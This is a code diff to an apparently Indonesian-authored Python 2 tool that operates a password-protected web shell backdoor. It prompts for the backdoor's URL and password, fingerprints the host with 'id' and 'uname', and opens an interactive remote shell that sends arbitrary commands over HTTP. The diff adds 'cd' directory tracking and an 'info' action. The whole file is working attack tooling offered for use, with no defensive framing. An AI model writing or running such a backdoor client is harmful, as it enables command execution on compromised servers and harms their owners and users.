@@ -2,6 +2,7 @@
 from requests import get
 from time import sleep
 import os
+import re
 
 def cls():
     os.system('cls' if os.name=='nt' else 'clear')
@@ -24,6 +25,30 @@ def banner():
     s/                  +s    
     """)
 
+def fiturcd(cmd, getdir):
+    getcmd = re.match(r'cd (.*)', cmd, re.M|re.I)
+    newdir1 = ""
+
+    if getcmd:
+        if getcmd.group(1) == "..":
+            for i in getdir.split('/')[:-1]:
+                newdir1 += i + "/"
+        
+            result = newdir1
+
+            return result
+            
+        else:
+            for i in getdir.split('/'):
+                newdir1 += i + "/" 
+            
+            result = newdir1 + getcmd.group(1)
+
+            return result
+    else:
+        return False
+
+    
 def connect():
     url = raw_input("[?] Input Backdoor Location\t: ")
     password = raw_input("[?] Input Backdoor Password\t: ")
@@ -38,31 +63,36 @@ def connect():
     
         userID = get(url, params={"password":password,"cmd":"id"}).text.replace('\n','')
         kernel = get(url, params={"password":password,"cmd":"uname -nvpmso"}).text.replace('\n','')
-        getpwnd = get(url, params={"password":password,"cmd":"pwd"}).text.replace('\n','')
-        
-        print("[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]")
-        print("[!] Backdoor Is Live.. Waiting to Connect BackDoor")
-        print("[+] Kernel\t: " + kernel)
-        print("[+] User ID\t: " + userID)
-        print("[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n")
-        
+        getdir = get(url, params={"password":password,"cmd":"pwd"}).text.replace('\n','')
         sleep(2)
-        #PARAMS = {"password":password,"cmd":"whoami"}
-        #r = get(url, params=PARAMS).text
-        #domain = get(url, params="domain").text.replace('\n','')
-        command = "Remback@shell:" +getpwnd + "# "
+        print("[!] Backdoor Is Live.. Waiting to Connect BackDoor\n")
+        sleep(2)
+
+
+        command = "Remback@shell:" +getdir + "# "
+        result = ""
+        
         while True:
                 cmd = raw_input(command)
+
                 if cmd == "exit":
                     break
                 elif cmd == "clear":
                     cls()
-                    
-                    
-                PARAMS = {"password":password,"cmd":cmd}
-                result = get(url, params=PARAMS).text
-                print(result + "\n")
-            
+                elif cmd == "info":
+                    result = get(url, params={"password":password,"dir":getdir,"aksi":"info","cmd":""}).text
+                    print(result)
+
+
+                if(fiturcd(cmd, getdir) != False):
+                    output = fiturcd(cmd, getdir)
+                    getdir = get(url, params={"password":password,"dir":output,"cmd":"pwd"}).text.replace('\n','')
+                    result = get(url, params={"password":password,"dir":getdir,"cmd":cmd}).text
+                    command = "Remback@shell:" +getdir + "# "
+                else:
+                    result = get(url, params={"password":password,"dir":getdir,"cmd":cmd}).text
+
+                print(result + "\n")         
     
     else:
         print("[-] Password is Incoret")
